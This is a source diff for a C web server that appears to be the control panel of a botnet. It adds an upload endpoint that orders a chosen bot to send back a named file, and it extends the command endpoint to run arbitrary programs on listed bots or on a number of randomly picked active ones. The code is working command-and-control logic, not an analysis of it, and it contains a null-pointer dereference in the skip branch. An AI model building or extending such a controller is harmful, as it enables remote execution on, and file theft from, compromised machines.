@@ -10,7 +10,7 @@
 #include "../include/server/hash_table.h"
 #include "../include/commands.h"
 #include "../include/logging.h"
-#include "../include/web_server.h"
+#include "../include/server/web_server.h"
 #include "../include/server/server_constants.h"
 #include "../include/send_message.h"
 #include "../include/receive_message.h"
@@ -76,29 +76,13 @@ void handle_list_bots(struct mg_connection *c, struct mg_http_message *hm) {
     mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response);
 }
 
-// Function to handle sending a command to a client
-void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
-    char bot_id[256] = {0}; // Declare bot_id
-    char cmd_id[64] = {0};
-    char program[256] = {0};
-    char params[256] = {0};
-    int delay = 0;
-    int expected_code = 0;
-    char delay_str[16] = {0};
-    char expected_code_str[16] = {0};
-
+void handle_send_upload(struct mg_connection *c, struct mg_http_message *hm) {
+    char bot_id[256] = {0};
+    char file_name[256] = {0};
 
     // Parse fields from the POST request
-    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id)); // Parse bot_id
-    mg_http_get_var(&hm->body, "cmd_id", cmd_id, sizeof(cmd_id));
-    mg_http_get_var(&hm->body, "program", program, sizeof(program));
-    mg_http_get_var(&hm->body, "params", params, sizeof(params));
-    mg_http_get_var(&hm->body, "delay", delay_str, sizeof(delay_str));
-    mg_http_get_var(&hm->body, "expected_code", expected_code_str, sizeof(expected_code_str));
-
-    // Parse integers
-    delay = strlen(delay_str) > 0 ? atoi(delay_str) : 0;
-    expected_code = strlen(expected_code_str) > 0 ? atoi(expected_code_str) : 0;
+    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
+    mg_http_get_var(&hm->body, "file_name", file_name, sizeof(file_name));
 
     // Validate required fields
     if (strlen(bot_id) == 0) {
@@ -106,8 +90,8 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
         return;
     }
 
-    if (strlen(program) == 0) {
-        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Program is required\"}");
+    if (strlen(file_name) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File name is required\"}");
         return;
     }
 
@@ -120,66 +104,142 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
 
     // Build the Command struct
     Command cmd = {
-        .cmd_id = "",
-        .delay = delay,
-        .program = strdup(program),
-        .expected_exit_code = expected_code,
-        .params = NULL // Initialize params to NULL
+        .cmd_id = "UPLOAD",
+        .order_type = UPLOAD,
+        .delay = 0,
+        .program = strdup("UPLOAD"),
+        .expected_exit_code = 0,
+        .params = malloc(2 * sizeof(char *)) // Allocate space for params
     };
-    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
 
-    // Parse params into a null-terminated array
-    if (strlen(params) > 0) {
-        char *param_token = strtok(params, " ");
-        size_t param_count = 0;
-
-        while (param_token != NULL) {
-            cmd.params = realloc(cmd.params, (param_count + 1) * sizeof(char *));
-            cmd.params[param_count] = strdup(param_token);
-            param_count++;
-            param_token = strtok(NULL, " ");
-        }
-
-        // Null-terminate the params array
-        cmd.params = realloc(cmd.params, (param_count + 1) * sizeof(char *));
-        cmd.params[param_count] = NULL;
-    }
-
-    output_log("Got Bot ID : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, bot_id);
-    output_log("Got CMD ID : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.cmd_id);
-    output_log("Got program : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.program);
-    char buffer[1024] = {0};
-    size_t offset = 0;
-
-    if (cmd.params != NULL) {
-        for (size_t i = 0; cmd.params[i] != NULL; i++) {
-            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%s ", cmd.params[i]);
-        }
-    }
-    output_log("Got params : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, buffer);
-    output_log("Got delay : %d\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.delay);
-    output_log("Got expected code : %d\n", LOG_DEBUG, LOG_TO_CONSOLE, expected_code);
-
-    // Write to log
-    char log_message[1024] = {0};
-    snprintf(log_message, sizeof(log_message), 
-            "Server : Executing command (%s) (%s) with delay (%d), code (%d)", 
-            cmd.program, 
-            buffer, // Params
-            cmd.delay, 
-            cmd.expected_exit_code);
-    write_to_client_log(client, log_message);
+    cmd.params[0] = strdup(file_name); // Add the file name as the first parameter
+    cmd.params[1] = NULL; // Null-terminate the params array
 
     // Send the command to the client
     if (send_command(client->socket, &cmd) < 0) {
-        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send command to client\"}");
-        output_log("Failed while sending command to client\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send upload command to client\"}");
         free_command(&cmd); // Free dynamically allocated fields
         return;
     }
 
     mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
     free_command(&cmd); // Free dynamically allocated fields
+}
+
+// Function to handle sending a command to a client
+void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
+    char bot_ids[1024] = {0};
+    char num_clients_str[16] = {0};
+    char cmd_id[64] = {0};
+    char program[256] = {0};
+    char params[256] = {0};
+    char delay_str[16] = {0};
+    char expected_code_str[16] = {0};
+
+    // Parse fields from the POST request
+    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));
+    mg_http_get_var(&hm->body, "num_clients", num_clients_str, sizeof(num_clients_str));
+    mg_http_get_var(&hm->body, "cmd_id", cmd_id, sizeof(cmd_id));
+    mg_http_get_var(&hm->body, "program", program, sizeof(program));
+    mg_http_get_var(&hm->body, "params", params, sizeof(params));
+    mg_http_get_var(&hm->body, "delay", delay_str, sizeof(delay_str));
+    mg_http_get_var(&hm->body, "expected_code", expected_code_str, sizeof(expected_code_str));
+
+    
+
+    int delay = atoi(delay_str);
+    int expected_code = atoi(expected_code_str);
+    int num_clients = atoi(num_clients_str);
+
+    // Validate input
+    if (strlen(program) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Program is required\"}");
+        return;
+    }
+
+    size_t targeted_clients = 0;
+
+    // If bot IDs are provided, target those specific clients
+    if (strlen(bot_ids) > 0) {
+        output_log("Found bot list, looping over and sending commands!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        char *bot_id = strtok(bot_ids, ",");
+        while (bot_id != NULL) {
+            Client *client = find_client(&hash_table, bot_id);
+            if (client != NULL && client->state == LISTENING) { // Only target active clients
+                Command cmd = {
+                    .cmd_id = "",
+                    .order_type = COMMAND_,
+                    .delay = delay,
+                    .program = strdup(program),
+                    .expected_exit_code = expected_code,
+                    .params = malloc(2 * sizeof(char *))
+                };
+
+                strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
+                cmd.params[0] = strdup(params);
+                cmd.params[1] = NULL;
+
+                if (send_command(client->socket, &cmd) == 0) {
+                    targeted_clients++;
+                }
+
+                free_command(&cmd);
+            } else {
+                output_log("Skipping client %s with invalid socket or state\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id);
+            }
+            bot_id = strtok(NULL, ",");
+        }
+    } else if (num_clients > 0) {
+        output_log("Found number of clients, sending command!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        // If no bot IDs are provided, target random active clients
+        for (size_t i = 0; i < hash_table.size && targeted_clients < num_clients; i++) {
+            Client *client = hash_table.table[i];
+            while (client != NULL && targeted_clients < num_clients) {
+                output_log("Sending to client %s with state %d!\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id, client->state);
+                if (client->state == LISTENING && client->socket > 0) { // Only target listening clients with valid sockets
+                    Command cmd = {
+                        .cmd_id = "",
+                        .order_type = COMMAND_,
+                        .delay = delay,
+                        .program = strdup(program),
+                        .expected_exit_code = expected_code,
+                        .params = NULL // Initialize params to NULL
+                    };
+
+                    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
+
+                    // Split the params string into individual parameters
+                    if (strlen(params) > 0) {
+                        size_t param_count = 0;
+                        char *param = strtok(params, " ");
+                        while (param != NULL) {
+                            cmd.params = realloc(cmd.params, (param_count + 2) * sizeof(char *)); // Allocate space for new param
+                            cmd.params[param_count] = strdup(param); // Copy the parameter
+                            param_count++;
+                            param = strtok(NULL, " ");
+                        }
+                        cmd.params[param_count] = NULL; // Null-terminate the params array
+                    }
+
+                    if (send_command(client->socket, &cmd) == 0) {
+                        targeted_clients++;
+                    }
+
+                    free_command(&cmd); // Free dynamically allocated fields
+                } else {
+                    output_log("Skipping client %s with invalid socket or state\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id);
+                }
+                client = client->next;
+            }
+        }
+    }
+
+    // Respond with the number of targeted clients
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\",\"targeted_clients\":%lu}", targeted_clients);
+
+    if (targeted_clients < num_clients) {
+        output_log("Only %zu active clients were available to target (requested: %d)\n", LOG_DEBUG, LOG_TO_CONSOLE, targeted_clients, num_clients);
+    }
 }
 
 // Function to handle server status
@@ -336,46 +396,34 @@ void handle_get_bot_file(struct mg_connection *c, struct mg_http_message *hm) {
     int start = (total_lines > lines + offset) ? total_lines - lines - offset : 0;
     int end = (total_lines > offset) ? total_lines - offset : 0;
 
-    // Dynamically allocate the response buffer
-    size_t response_size = 8192; // Start with 8 KB response size
-    char *response = malloc(response_size); // use malloc, not a char buffer. OVERFLOW DANGER OTHERWISE
-    if (response == NULL) {
-        free(lines_buffer);
-        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Memory allocation failed\"}");
-        return;
-    }
-    response[0] = '\0'; // Initialize the response buffer
+    // Construct the JSON response
+    cJSON *response_json = cJSON_CreateObject();
+    cJSON *lines_array = cJSON_CreateArray();
 
-    // Construct the response
     for (int i = start; i < end; i++) {
         int index = i % (lines + offset);
         if (lines_buffer[index] != NULL) {
-            size_t line_length = strlen(lines_buffer[index]);
-            size_t current_length = strlen(response);
-
-            // Is buffer too small??
-            if (current_length + line_length + 1 >= response_size) {
-                response_size *= 2; // Increase buffer size -> Prevent buffer overflow if return file is "huge"
-                char *new_response = realloc(response, response_size);
-                if (new_response == NULL) {
-                    free(response);
-                    free(lines_buffer);
-                    mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Memory allocation failed\"}");
-                    return;
-                }
-                response = new_response;
+            if (strlen(lines_buffer[index]) > 0) { // Ensure the string is not empty
+                cJSON_AddItemToArray(lines_array, cJSON_CreateString(lines_buffer[index]));
             }
-
-            // Append the line to the response
-            strncat(response, lines_buffer[index], response_size - current_length - 1);
             free(lines_buffer[index]); // Free the line after using it
+            lines_buffer[index] = NULL; // Avoid dangling pointer
         }
     }
-    free(lines_buffer);
 
-    // Send the response
-    mg_http_reply(c, 200, "Content-Type: text/plain\r\n", "%s", response);
-    free(response);
+    free(lines_buffer); // Free the lines_buffer array
+
+    cJSON_AddItemToObject(response_json, "lines", lines_array);
+
+    // Convert the JSON object to a string
+    char *response_str = cJSON_PrintUnformatted(response_json);
+
+    // Send the JSON response
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);
+
+    // Free resources
+    cJSON_Delete(response_json);
+    free(response_str);
 }
 
 void handle_get_cwd(struct mg_connection *c, struct mg_http_message *hm) {
@@ -450,7 +498,10 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
     if (ev == MG_EV_HTTP_MSG) {
         if (strncmp(hm->uri.buf, "/api/bots", hm->uri.len) == 0) {
             handle_list_bots(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/upload", hm->uri.len) == 0) {
+            handle_send_upload(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
+            output_log("Received send command request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
             handle_send_command(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/status", hm->uri.len) == 0) {
             handle_server_status(c, hm, socket, connect, mg_http_reply);
